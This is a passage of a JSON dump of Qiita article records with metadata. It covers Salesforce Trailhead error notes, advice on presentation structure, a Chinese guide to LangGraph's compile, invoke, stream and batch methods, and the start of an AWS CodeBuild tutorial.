      "body": "前月とは少し傾向が違う感じがしますね\n\n# Einstein Setup is not enabled.\n\n+ [Help with Agentforce Servcice Assistant Challenge](https://trailhead.salesforce.com/trailblazer-community/feed/0D5KX00000j9TrR)\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/328136/5d4664e6-74c2-4c43-a594-0125e31388cc.png)\n\n:::note\nTry turning Einstein Setup on and off, then finally turn it on and verify.\n:::\n\n# Sales Coach Agent can't be assigned the Agentforce Sales Coach User permission set license, because Sales Coach Agent's user license doesn't support it. \n\n+ [What is required to add the Use agent Sales Coach](https://trailhead.salesforce.com/trailblazer-community/feed/0D5KX00000j9Tqi)\n\n:::note\nI missed the error message was for a PREVIOUS step not the last step I did.\n:::\n\n\n\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T14:59:24+09:00",
      "group": null,
      "id": "a98769e8481c432fc87b",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Salesforce",
          "versions": []
        }
      ],
      "title": "2025年12月 トレイルヘッドでのエラー",
      "updated_at": "2025-12-09T15:02:27+09:00",
      "url": "https://qiita.com/Keiji_otsubo/items/a98769e8481c432fc87b",
      "user": {
        "description": "ユーザ企業でSalesforceの管理者をやっています。ゴリゴリLigtningでApexコードを書いています。",
        "facebook_id": "",
        "followees_count": 3,
        "followers_count": 102,
        "github_login_name": null,
        "id": "Keiji_otsubo",
        "items_count": 2819,
        "linkedin_id": "",
        "location": "",
        "name": "Keiji Otsubo",
        "organization": "",
        "permanent_id": 328136,
        "profile_image_url": "https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/328136/5c48a7ebb1a42b8ad6804027ffc147a98d196763/large.png?1592610222",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": ""
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<p data-sourcepos=\"1:1-1:42\">【1. 文章・説明の基本ルール】</p>\n<p data-sourcepos=\"3:1-4:66\">主語を必ず入れる<br>\n・「誰が」「何が」「どうするか」を明確にする</p>\n<p data-sourcepos=\"6:1-11:49\">形容詞を入れる<br>\n・ただの名詞では弱い<br>\n・「形容詞＋名詞」で印象を作る<br>\n・さらに「主語＋動詞」で具体化する<br>\n例：× すごい技術<br>\n　　○ この技術は〇〇を可能にする</p>\n<p data-sourcepos=\"13:1-15:35\">文章でダラダラ書かない<br>\n・箇条書きで整理する<br>\n・1項目1メッセージにする</p>\n<p data-sourcepos=\"17:1-19:25\">メリット・デメリットを書く<br>\n・分けて短く箇条書き<br>\n・各1行でまとめる</p>\n<p data-sourcepos=\"21:1-22:63\">────────────────<br>\n【2. パワーポイント作成の前に徹底すること】</p>\n<p data-sourcepos=\"24:1-25:54\">いきなりスライドを作らない<br>\n・まず内容の設計（ストーリー）を行う</p>\n<p data-sourcepos=\"27:1-29:39\">ストーリーを作る<br>\n・何を伝えたいか（ゴール）<br>\n・どの順番で話すか（流れ）</p>\n<p data-sourcepos=\"31:1-34:9\">ストーリーに沿って決める<br>\n・タイトル<br>\n・図（構造・関係・流れ）<br>\n・結論</p>\n<p data-sourcepos=\"36:1-38:51\">作業報告を書かない<br>\n・「何をやったか」ではなく「何がわかったか」で説明する<br>\n・データで語る（グラフ、表、数値）</p>\n<p data-sourcepos=\"40:1-42:38\">ページ数を意識する<br>\n・全体のページ数を最初に決める<br>\n・1ページ1メッセージにする</p>\n<p data-sourcepos=\"44:1-45:33\">────────────────<br>\n【3. 考え方の優先順位】</p>\n<p data-sourcepos=\"47:1-48:78\">目的最優先<br>\n・何を目指すのか（目的・成果・ゴール）を最初に決める</p>\n<p data-sourcepos=\"50:1-51:90\">戦略最優先<br>\n・全体方針・シナリオ（誰に、何を、どう変えてほしいか）を重視</p>\n<p data-sourcepos=\"53:1-55:78\">戦術にこだわらない<br>\n・デザインや細かい形式に執着しない<br>\n・戦略から逆算して戦術（図、表、スライド構成）を選ぶ</p>\n<p data-sourcepos=\"57:1-60:27\">解説しすぎない<br>\n・文章を詰め込まない<br>\n・図とデータで伝える<br>\n・説明は口頭で補う</p>\n<p data-sourcepos=\"62:1-63:36\">────────────────<br>\n【4. 要求・構成の作り方】</p>\n<p data-sourcepos=\"65:1-67:36\">「要求」を明確に書く<br>\n・何を決めてほしいのか<br>\n・何を承認してほしいのか</p>\n<p data-sourcepos=\"69:1-69:33\">構成を先に決める（例）</p>\n<p data-sourcepos=\"71:1-71:15\">背景・目的</p>\n<p data-sourcepos=\"73:1-73:15\">手法・条件</p>\n<p data-sourcepos=\"75:1-75:27\">結果（データ・図）</p>\n<p data-sourcepos=\"77:1-77:15\">考察・結論</p>\n<p data-sourcepos=\"79:1-79:24\">今後の方針・要求</p>\n<p data-sourcepos=\"81:1-83:66\">技術紹介で終わらない<br>\n・“目的 → 課題 → 解決” の順に整理する<br>\n・「この技術はどの課題を解決するのか」を示す</p>\n<p data-sourcepos=\"85:1-86:39\">────────────────<br>\n【5. 自分用チェックリスト】</p>\n<p data-sourcepos=\"88:1-96:63\">主語は入っているか？<br>\n形容詞＋主語＋動詞で具体化されているか？<br>\n箇条書きになっているか？<br>\nメリット・デメリットを書いたか？<br>\n目的・ストーリー・タイトル・図・結論を作ったか？<br>\n作業報告になっていないか？（データ中心に説明しているか？）<br>\nページ数と構成を先に決めたか？<br>\n戦略から逆算して戦術を選んでいるか？<br>\n技術紹介で終わらず課題解決を示せているか？</p>\n<p data-sourcepos=\"98:1-99:48\">────────────────<br>\n【6. タイトル・ストーリー・結論】</p>\n<p data-sourcepos=\"101:1-103:75\">タイトル<br>\n・主張を一言で示す<br>\n・「〜の提案」「〜の改善」など目的を見える形にする</p>\n<p data-sourcepos=\"105:1-108:57\">ストーリー<br>\n・冒頭でゴールを提示<br>\n・背景 → 課題 → データ → 解決策 → 結論 の流れ<br>\n・情報を並べず、意味のつながりを見せる</p>\n<p data-sourcepos=\"110:1-113:42\">結論<br>\n・最重要ポイントだけを書く<br>\n・「だから何か？」を明確にする<br>\n・次のアクション／判断を示す</p>\n<p data-sourcepos=\"115:1-116:83\">────────────────<br>\n【7. パワーポイントは“仕様書”を先に作り、生成AIで作る】</p>\n<p data-sourcepos=\"118:1-119:63\">パワポを直接作らない<br>\n・最初に仕様書（スライド設計書）を作成する</p>\n<p data-sourcepos=\"121:1-127:39\">仕様書に入れる項目<br>\n・目的（誰に何を伝えるか）<br>\n・ストーリー（背景→課題→データ→解決）<br>\n・ページ構成（1ページ1メッセージ）<br>\n・使用する図・グラフ・数値<br>\n・結論（最重要ポイント）<br>\n・要求（相手に求める判断）</p>\n<p data-sourcepos=\"129:1-132:42\">文章と表だけにしない<br>\n・必ず図を入れる<br>\n・流れ図／構造図／比較図／ブロック図など<br>\n・図のほうがメッセージが強い</p>\n<p data-sourcepos=\"134:1-136:29\">生成AIに仕様書を渡す<br>\n・人は「戦略と内容」に集中する<br>\n・見た目はAIに任せる</p>\n<p data-sourcepos=\"138:1-139:72\">────────────────<br>\n【8. データは「トレードオフ」で示す（図＋文字）】</p>\n<p data-sourcepos=\"141:1-142:42\">データ提示は必ず横軸×縦軸の2Dプロットにする<br>\n例：横軸＝コスト、縦軸＝性能</p>\n<p data-sourcepos=\"144:1-144:33\">プレーンテキスト図例：</p>\n<p data-sourcepos=\"146:1-153:35\">性能 ↑<br>\n|<br>\n高 |           ● 手法C<br>\n|      ● 手法B<br>\n|  ● 手法A<br>\n|<br>\n低 +--------------------------→ コスト<br>\n低         中          高</p>\n<p data-sourcepos=\"156:1-160:39\">理由（文字説明）<br>\n・一目で比較できる<br>\n・議論が感覚ではなく構造になる<br>\n・結論の誘導がしやすい<br>\n・定性的な話を定量化できる</p>\n<p data-sourcepos=\"162:1-164:27\">最新のデータを使う<br>\n・データソースの更新日を明記する<br>\n・古いデータは禁止</p>\n<p data-sourcepos=\"166:1-168:51\">参考文献<br>\n・文中は【著者 年】<br>\n・最後に「参考文献」一覧でまとめる</p>\n<p data-sourcepos=\"170:1-174:36\">────────────────<br>\n【この文書が必要な用途】<br>\n・教官への理解報告<br>\n・パワポ制作のガイドライン<br>\n・研究発表全般の設計指針</p>\n",
      "body": "【1. 文章・説明の基本ルール】\n\n主語を必ず入れる\n・「誰が」「何が」「どうするか」を明確にする\n\n形容詞を入れる\n・ただの名詞では弱い\n・「形容詞＋名詞」で印象を作る\n・さらに「主語＋動詞」で具体化する\n例：× すごい技術\n　　○ この技術は〇〇を可能にする\n\n文章でダラダラ書かない\n・箇条書きで整理する\n・1項目1メッセージにする\n\nメリット・デメリットを書く\n・分けて短く箇条書き\n・各1行でまとめる\n\n────────────────\n【2. パワーポイント作成の前に徹底すること】\n\nいきなりスライドを作らない\n・まず内容の設計（ストーリー）を行う\n\nストーリーを作る\n・何を伝えたいか（ゴール）\n・どの順番で話すか（流れ）\n\nストーリーに沿って決める\n・タイトル\n・図（構造・関係・流れ）\n・結論\n\n作業報告を書かない\n・「何をやったか」ではなく「何がわかったか」で説明する\n・データで語る（グラフ、表、数値）\n\nページ数を意識する\n・全体のページ数を最初に決める\n・1ページ1メッセージにする\n\n────────────────\n【3. 考え方の優先順位】\n\n目的最優先\n・何を目指すのか（目的・成果・ゴール）を最初に決める\n\n戦略最優先\n・全体方針・シナリオ（誰に、何を、どう変えてほしいか）を重視\n\n戦術にこだわらない\n・デザインや細かい形式に執着しない\n・戦略から逆算して戦術（図、表、スライド構成）を選ぶ\n\n解説しすぎない\n・文章を詰め込まない\n・図とデータで伝える\n・説明は口頭で補う\n\n────────────────\n【4. 要求・構成の作り方】\n\n「要求」を明確に書く\n・何を決めてほしいのか\n・何を承認してほしいのか\n\n構成を先に決める（例）\n\n背景・目的\n\n手法・条件\n\n結果（データ・図）\n\n考察・結論\n\n今後の方針・要求\n\n技術紹介で終わらない\n・“目的 → 課題 → 解決” の順に整理する\n・「この技術はどの課題を解決するのか」を示す\n\n────────────────\n【5. 自分用チェックリスト】\n\n主語は入っているか？\n形容詞＋主語＋動詞で具体化されているか？\n箇条書きになっているか？\nメリット・デメリットを書いたか？\n目的・ストーリー・タイトル・図・結論を作ったか？\n作業報告になっていないか？（データ中心に説明しているか？）\nページ数と構成を先に決めたか？\n戦略から逆算して戦術を選んでいるか？\n技術紹介で終わらず課題解決を示せているか？\n\n────────────────\n【6. タイトル・ストーリー・結論】\n\nタイトル\n・主張を一言で示す\n・「〜の提案」「〜の改善」など目的を見える形にする\n\nストーリー\n・冒頭でゴールを提示\n・背景 → 課題 → データ → 解決策 → 結論 の流れ\n・情報を並べず、意味のつながりを見せる\n\n結論\n・最重要ポイントだけを書く\n・「だから何か？」を明確にする\n・次のアクション／判断を示す\n\n────────────────\n【7. パワーポイントは“仕様書”を先に作り、生成AIで作る】\n\nパワポを直接作らない\n・最初に仕様書（スライド設計書）を作成する\n\n仕様書に入れる項目\n・目的（誰に何を伝えるか）\n・ストーリー（背景→課題→データ→解決）\n・ページ構成（1ページ1メッセージ）\n・使用する図・グラフ・数値\n・結論（最重要ポイント）\n・要求（相手に求める判断）\n\n文章と表だけにしない\n・必ず図を入れる\n・流れ図／構造図／比較図／ブロック図など\n・図のほうがメッセージが強い\n\n生成AIに仕様書を渡す\n・人は「戦略と内容」に集中する\n・見た目はAIに任せる\n\n────────────────\n【8. データは「トレードオフ」で示す（図＋文字）】\n\nデータ提示は必ず横軸×縦軸の2Dプロットにする\n例：横軸＝コスト、縦軸＝性能\n\nプレーンテキスト図例：\n\n性能 ↑\n     |\n  高 |           ● 手法C\n     |      ● 手法B\n     |  ● 手法A\n     |\n  低 +--------------------------→ コスト\n       低         中          高\n\n\n理由（文字説明）\n・一目で比較できる\n・議論が感覚ではなく構造になる\n・結論の誘導がしやすい\n・定性的な話を定量化できる\n\n最新のデータを使う\n・データソースの更新日を明記する\n・古いデータは禁止\n\n参考文献\n・文中は【著者 年】\n・最後に「参考文献」一覧でまとめる\n\n────────────────\n【この文書が必要な用途】\n・教官への理解報告\n・パワポ制作のガイドライン\n・研究発表全般の設計指針\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T14:52:02+09:00",
      "group": null,
      "id": "34c4728a10f540f0a528",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Python",
          "versions": []
        }
      ],
      "title": "教官から言われた助言",
      "updated_at": "2025-12-09T14:52:02+09:00",
      "url": "https://qiita.com/qwer123123/items/34c4728a10f540f0a528",
      "user": {
        "description": "ﾃﾞﾝ (ง˘ω˘)วﾃﾞﾝ情報通信の民🐌🐌PID制御とFFTとステップ入力が大好き💕\r\n",
        "facebook_id": "",
        "followees_count": 1,
        "followers_count": 21,
        "github_login_name": null,
        "id": "qwer123123",
        "items_count": 638,
        "linkedin_id": "",
        "location": "",
        "name": "",
        "organization": "",
        "permanent_id": 3759109,
        "profile_image_url": "https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3759109/dcf91c0efc161c76861417f8b5fe0b64867052d5/x_large.png?1711810362",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": ""
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<p data-sourcepos=\"1:1-1:188\">在 LangGraph 中，workflow.compile() 是一个至关重要的步骤。它的作用是将你构建的图结构（StateGraph）转换成一个可执行的应用程序（CompiledGraph）。</p>\n<p data-sourcepos=\"3:1-3:189\">简单来说，在调用 .compile() 之前，你只是在定义流程图；调用之后，你就拥有了一个可以运行、可以流式输出、甚至可以拥有记忆的“机器”。</p>\n<h2 data-sourcepos=\"5:1-7:15\">\n<span id=\"以下是关于-compile-的详细用法和参数说明\" class=\"fragment\"></span><a href=\"#%E4%BB%A5%E4%B8%8B%E6%98%AF%E5%85%B3%E4%BA%8E-compile-%E7%9A%84%E8%AF%A6%E7%BB%86%E7%94%A8%E6%B3%95%E5%92%8C%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E\"><i class=\"fa fa-link\"></i></a>以下是关于 compile() 的详细用法和参数说明。</h2>\n<ol data-sourcepos=\"7:1-29:0\">\n<li data-sourcepos=\"7:1-11:0\">\n<p data-sourcepos=\"7:4-7:15\">核心作用</p>\n<ul data-sourcepos=\"8:5-11:0\">\n<li data-sourcepos=\"8:5-8:96\">验证图结构： 检查是否有孤立节点，是否定义了入口点（START）等。</li>\n<li data-sourcepos=\"9:5-11:0\">生成 Runnable： 返回的对象是一个标准的 LangChain Runnable，支持 .invoke(), .stream(), .batch() 等方法。\n<ul data-sourcepos=\"10:9-11:0\">\n<li data-sourcepos=\"10:9-11:0\">注入功能： 在这一步，你可以注入记忆（Persistence）和断点（Interrupts）。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li data-sourcepos=\"12:1-29:0\">\n<p data-sourcepos=\"12:4-12:28\">常用参数 (Parameters)</p>\n<ul data-sourcepos=\"13:5-29:0\">\n<li data-sourcepos=\"13:5-29:0\">\n<p data-sourcepos=\"13:7-16:98\">workflow.compile() 主要接收以下几个关键参数，用于增强 Agent 的能力：<br>\nA. checkpointer (持久化/记忆)这是最常用的参数。它允许图保存每一步的状态（State）。<br>\n作用： 实现“记忆”功能，支持长时间运行的任务，允许从特定的状态恢复（Time Travel）。<br>\n类型： BaseCheckpointSaver (例如 MemorySaver, AsyncSqliteSaver, PostgresSaver 等)。</p>\n<p data-sourcepos=\"18:9-20:54\">B. interrupt_before (执行前中断)作用：<br>\n在执行特定节点之前暂停。常用于“人机回圈”（Human-in-the-Loop），例如在执行敏感操作（如写入数据库、发送邮件）前等待用户批准。<br>\n类型： list[str] (节点名称的列表)。</p>\n<p data-sourcepos=\"22:9-24:54\">C. interrupt_after (执行后中断)<br>\n作用： 在执行特定节点之后暂停。常用于让用户检查某个步骤的输出结果，然后再决定是否继续。<br>\n类型： list[str] (节点名称的列表)。</p>\n<p data-sourcepos=\"26:9-27:30\">D. store (存储)作用： (较新版本) 用于跨不同 thread (对话) 共享数据，而不仅仅是当前对话的上下文。<br>\n类型： BaseStore。</p>\n</li>\n</ul>\n</li>\n</ol>\n<p data-sourcepos=\"30:1-30:1096\">workflow.compile() 生成的 CompiledGraph 对象（即你的 rag_agent）是 LangGraph 的核心执行单元。它不仅是一个简单的函数，更是一个能够管理状态、支持流式输出和能够“时间旅行”的复杂对象。以下是它的主要方法、具体区别和使用场景的详细对比：1. 核心执行方法对比这三个方法用于“运行”你的图，但交互方式不同。方法核心特点适用场景返回值.invoke()同步/阻塞后台任务、自动化脚本、不需要即时反馈的 API最终状态 (Final State).stream()流式/实时聊天机器人 UI、通过 SSE 推送消息、长任务进度展示生成器 (yields updates).batch()并发/批量批量处理文档、评测 (Evaluation)、数据清洗状态列表 (List of States)2. 具体代码示例假设我们有一个简单的图，状态包含 messages 列表。A. invoke (一次性拿结果)程序会“卡住”，直到图执行完所有步骤（或者遇到断点），然后一次性返回最终结果。Pythoninputs = {\"messages\": [(\"user\", \"你好，请介绍一下 LangGraph\")]}</p>\n<h1 data-sourcepos=\"32:1-32:17\">\n<span id=\"执行并等待\" class=\"fragment\"></span><a href=\"#%E6%89%A7%E8%A1%8C%E5%B9%B6%E7%AD%89%E5%BE%85\"><i class=\"fa fa-link\"></i></a>执行并等待</h1>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"33:1-35:3\"><div class=\"highlight\"><pre><code>final_state = rag_agent.invoke(inputs)\n</code></pre></div></div>\n<h1 data-sourcepos=\"37:1-37:26\">\n<span id=\"直接获取最终回复\" class=\"fragment\"></span><a href=\"#%E7%9B%B4%E6%8E%A5%E8%8E%B7%E5%8F%96%E6%9C%80%E7%BB%88%E5%9B%9E%E5%A4%8D\"><i class=\"fa fa-link\"></i></a>直接获取最终回复</h1>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"38:1-46:3\"><div class=\"highlight\"><pre><code>inputs = {\"messages\": [(\"user\", \"你好，请介绍一下 LangGraph\")]}\n\n# 执行并等待\nfinal_state = rag_agent.invoke(inputs)\n\n# 直接获取最终回复\nprint(final_state[\"messages\"][-1].content)\n</code></pre></div></div>\n<h1 data-sourcepos=\"49:1-49:38\">\n<span id=\"循环获取每一个节点的输出\" class=\"fragment\"></span><a href=\"#%E5%BE%AA%E7%8E%AF%E8%8E%B7%E5%8F%96%E6%AF%8F%E4%B8%80%E4%B8%AA%E8%8A%82%E7%82%B9%E7%9A%84%E8%BE%93%E5%87%BA\"><i class=\"fa fa-link\"></i></a>循环获取每一个节点的输出</h1>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"50:1-56:3\"><div class=\"highlight\"><pre><code>for event in rag_agent.stream(inputs):\n    # event 的格式通常是: {'节点名称': {'key': 'value'}}\n    for node_name, state_update in event.items():\n        print(f\"--- 正在执行: {node_name} ---\")\n        print(state_update) \n</code></pre></div></div>\n<p data-sourcepos=\"57:1-57:121\">C. batch (并行处理)LangGraph 会利用线程池并行处理多个输入，比写 for 循环调用 invoke 快得多。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"58:1-64:3\"><div class=\"highlight\"><pre><code>Pythoninputs_list = [\n    {\"messages\": [(\"user\", \"1+1等于几?\")]},\n    {\"messages\": [(\"user\", \"今天天气如何?\")]},\n    {\"messages\": [(\"user\", \"讲个笑话\")]}\n]\n</code></pre></div></div>\n<h1 data-sourcepos=\"66:1-66:14\">\n<span id=\"并行运行\" class=\"fragment\"></span><a href=\"#%E5%B9%B6%E8%A1%8C%E8%BF%90%E8%A1%8C\"><i class=\"fa fa-link\"></i></a>并行运行</h1>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"67:1-73:3\"><div class=\"highlight\"><pre><code>results = rag_agent.batch(inputs_list)\n\n# results 是一个列表，包含3个最终状态\nfor res in results:\n    print(res[\"messages\"][-1].content)\n</code></pre></div></div>\n",
      "body": "在 LangGraph 中，workflow.compile() 是一个至关重要的步骤。它的作用是将你构建的图结构（StateGraph）转换成一个可执行的应用程序（CompiledGraph）。\n\n简单来说，在调用 .compile() 之前，你只是在定义流程图；调用之后，你就拥有了一个可以运行、可以流式输出、甚至可以拥有记忆的“机器”。\n\n以下是关于 compile() 的详细用法和参数说明。\n---\n1. 核心作用\n    - 验证图结构： 检查是否有孤立节点，是否定义了入口点（START）等。\n    - 生成 Runnable： 返回的对象是一个标准的 LangChain Runnable，支持 .invoke(), .stream(), .batch() 等方法。\n        - 注入功能： 在这一步，你可以注入记忆（Persistence）和断点（Interrupts）。\n\n2. 常用参数 (Parameters)\n    - workflow.compile() 主要接收以下几个关键参数，用于增强 Agent 的能力：\n        A. checkpointer (持久化/记忆)这是最常用的参数。它允许图保存每一步的状态（State）。\n        作用： 实现“记忆”功能，支持长时间运行的任务，允许从特定的状态恢复（Time Travel）。\n        类型： BaseCheckpointSaver (例如 MemorySaver, AsyncSqliteSaver, PostgresSaver 等)。\n\n        B. interrupt_before (执行前中断)作用： \n        在执行特定节点之前暂停。常用于“人机回圈”（Human-in-the-Loop），例如在执行敏感操作（如写入数据库、发送邮件）前等待用户批准。\n        类型： list[str] (节点名称的列表)。\n\n        C. interrupt_after (执行后中断)\n        作用： 在执行特定节点之后暂停。常用于让用户检查某个步骤的输出结果，然后再决定是否继续。\n        类型： list[str] (节点名称的列表)。\n\n        D. store (存储)作用： (较新版本) 用于跨不同 thread (对话) 共享数据，而不仅仅是当前对话的上下文。\n        类型： BaseStore。\n\n\nworkflow.compile() 生成的 CompiledGraph 对象（即你的 rag_agent）是 LangGraph 的核心执行单元。它不仅是一个简单的函数，更是一个能够管理状态、支持流式输出和能够“时间旅行”的复杂对象。以下是它的主要方法、具体区别和使用场景的详细对比：1. 核心执行方法对比这三个方法用于“运行”你的图，但交互方式不同。方法核心特点适用场景返回值.invoke()同步/阻塞后台任务、自动化脚本、不需要即时反馈的 API最终状态 (Final State).stream()流式/实时聊天机器人 UI、通过 SSE 推送消息、长任务进度展示生成器 (yields updates).batch()并发/批量批量处理文档、评测 (Evaluation)、数据清洗状态列表 (List of States)2. 具体代码示例假设我们有一个简单的图，状态包含 messages 列表。A. invoke (一次性拿结果)程序会“卡住”，直到图执行完所有步骤（或者遇到断点），然后一次性返回最终结果。Pythoninputs = {\"messages\": [(\"user\", \"你好，请介绍一下 LangGraph\")]}\n\n# 执行并等待\n```\nfinal_state = rag_agent.invoke(inputs)\n```\n\n# 直接获取最终回复\n```\ninputs = {\"messages\": [(\"user\", \"你好，请介绍一下 LangGraph\")]}\n\n# 执行并等待\nfinal_state = rag_agent.invoke(inputs)\n\n# 直接获取最终回复\nprint(final_state[\"messages\"][-1].content)\n```\n\n\n# 循环获取每一个节点的输出\n```\nfor event in rag_agent.stream(inputs):\n    # event 的格式通常是: {'节点名称': {'key': 'value'}}\n    for node_name, state_update in event.items():\n        print(f\"--- 正在执行: {node_name} ---\")\n        print(state_update) \n```\nC. batch (并行处理)LangGraph 会利用线程池并行处理多个输入，比写 for 循环调用 invoke 快得多。\n```\nPythoninputs_list = [\n    {\"messages\": [(\"user\", \"1+1等于几?\")]},\n    {\"messages\": [(\"user\", \"今天天气如何?\")]},\n    {\"messages\": [(\"user\", \"讲个笑话\")]}\n]\n```\n\n# 并行运行\n```\nresults = rag_agent.batch(inputs_list)\n\n# results 是一个列表，包含3个最终状态\nfor res in results:\n    print(res[\"messages\"][-1].content)\n```\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T14:48:08+09:00",
      "group": null,
      "id": "ff53dac9fa3d23de2837",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "compiler",
          "versions": []
        },
        {
          "name": "LangChain",
          "versions": []
        }
      ],
      "title": "langGraphの使い方（compile）",
      "updated_at": "2025-12-09T14:48:08+09:00",
      "url": "https://qiita.com/gaopan0630/items/ff53dac9fa3d23de2837",
      "user": {
        "description": null,
        "facebook_id": null,
        "followees_count": 1,
        "followers_count": 0,
        "github_login_name": null,
        "id": "gaopan0630",
        "items_count": 7,
        "linkedin_id": null,
        "location": null,
        "name": "",
        "organization": null,
        "permanent_id": 4107804,
        "profile_image_url": "https://lh3.googleusercontent.com/a/ACg8ocKH2AXSVCDiEM6gvdvy1tdtvjYJbWVfYyf2Qq8OXSbk04Ma_g=s96-c",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": null
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-4:166\">これまでの記事でいくつものAWSのDevToolsについて紹介していますが、今回はAWSCodeBuildの紹介をします。<br>\nAWSCodeBuildはテストやソースコードのコンパイルなどの、作成物をデプロイする前のお決まりの作業を自動化するためによく利用されます。<br>\n以前の私の記事でAWSCodeCommmitやAWSCodeDeployについて紹介していますが、AWSCodeBuildも同じCodeシリーズとしてよく紹介されます。</p>\n<p data-sourcepos=\"6:1-6:181\">※日本で12月に行われているQiitaアドベントカレンダーの枠が埋まったため、今回はアドベントカレンダーとは関連付けはありません。</p>\n<h1 data-sourcepos=\"8:1-8:8\">\n<span id=\"前提\" class=\"fragment\"></span><a href=\"#%E5%89%8D%E6%8F%90\"><i class=\"fa fa-link\"></i></a>前提</h1>\n<p data-sourcepos=\"9:1-9:237\">AWSCodePipelineやGitHubActionsなどで自動実行される設定をされることが多いと思いますが、今回の記事ではDevToolsの布教活動が目的のため、ツールの基本の使い方を紹介しています。</p>\n<h1 data-sourcepos=\"12:1-12:22\">\n<span id=\"aws-codebuild-とは\" class=\"fragment\"></span><a href=\"#aws-codebuild-%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>AWS CodeBuild とは</h1>\n<p data-sourcepos=\"13:1-14:137\">AWSCodeBuildはS3やAWSCodeCommit,GiTHubに保存されたソースコードのコンパイルや、ユニットテストの実行などを行います。<br>\nCI/CDを実現する際に成果物のリポジトリの反映やデプロイ前のテストやコンパイルによく使われます。</p>\n<p data-sourcepos=\"16:1-17:121\">↓ イメージ図はこのようになります（GoogleGeminiで生成しています）<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fe877411e-6650-4ceb-bb22-b3d7974fc7c2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=fe4a0ca1936e4b636f417e9d7b6ebb57\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fe877411e-6650-4ceb-bb22-b3d7974fc7c2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=fe4a0ca1936e4b636f417e9d7b6ebb57\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fe877411e-6650-4ceb-bb22-b3d7974fc7c2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=45ce68ac1c0feefb0b7e76228b32006c 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/e877411e-6650-4ceb-bb22-b3d7974fc7c2.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"20:1-20:29\">\n<span id=\"この記事で試すこと\" class=\"fragment\"></span><a href=\"#%E3%81%93%E3%81%AE%E8%A8%98%E4%BA%8B%E3%81%A7%E8%A9%A6%E3%81%99%E3%81%93%E3%81%A8\"><i class=\"fa fa-link\"></i></a>この記事で試すこと</h1>\n<p data-sourcepos=\"21:1-21:89\">CloudFormationに対するテスト( AWS CloudFormation Guard)をCodeBuildで実行する</p>\n<h2 data-sourcepos=\"23:1-23:34\">\n<span id=\"aws-cloudformation-guard-とは\" class=\"fragment\"></span><a href=\"#aws-cloudformation-guard-%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>AWS CloudFormation Guard とは</h2>\n<p data-sourcepos=\"24:1-26:169\">CloudFormationテンプレートの定義内容が意図した内容になっているかをテストするツール。<br>\nyaml形式で定義のルールを記載して、そのルールとテンプレートの内容が一致しているか判定します。<br>\n例えば、Lambda関数の「タイムアウト設定」が「90秒であること」や「90秒以下であること」などをルールとして定義できます。</p>\n<h1 data-sourcepos=\"29:1-29:20\">\n<span id=\"codebuildの設定\" class=\"fragment\"></span><a href=\"#codebuild%E3%81%AE%E8%A8%AD%E5%AE%9A\"><i class=\"fa fa-link\"></i></a>CodeBuildの設定</h1>\n<h2 data-sourcepos=\"30:1-30:39\">\n<span id=\"codebuildプロジェクトの作成\" class=\"fragment\"></span><a href=\"#codebuild%E3%83%97%E3%83%AD%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%81%AE%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>CodeBuildプロジェクトの作成</h2>\n<p data-sourcepos=\"31:1-31:97\">AWS CodeBuildのコンソール画面で「プロジェクトを作成する」を選択します</p>\n<p data-sourcepos=\"33:1-33:121\"><a 